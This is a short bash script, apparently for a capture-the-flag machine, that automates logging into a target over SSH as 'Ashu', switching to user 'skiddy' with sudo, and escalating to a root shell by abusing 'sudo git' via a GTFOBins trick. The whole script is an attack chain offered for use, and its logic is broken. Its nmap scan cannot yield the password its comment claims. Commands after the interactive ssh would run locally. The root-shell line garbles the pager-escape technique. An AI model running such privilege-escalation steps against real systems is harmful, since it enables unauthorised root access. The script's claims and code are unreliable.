#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Basic enumeration to obtain Ashu's password/ssh id_rsa key
echo "Basic enumeration in progress..."
nmap -p 22 --script ssh2-enum-algos $ip_address

# Connect to the machine as user Ashu
echo "Connecting to $ip_address as user Ashu..."
ssh Ashu@$ip_address

# Check sudo privileges for user skiddy
echo "Checking sudo privileges for user skiddy..."
sudo -l -U skiddy

# Elevate to user skiddy shell
echo "Elevating to user skiddy shell..."
sudo su skiddy

# Confirm sudo privileges to run git as sudo
echo "Checking sudo privileges for running git..."
sudo -l | grep -i "git"

# Exploit GTFObins to obtain root shell
echo "Exploiting GTFObins to gain root shell..."
sudo git -p help config | /bin/sh

echo "Script execution completed."
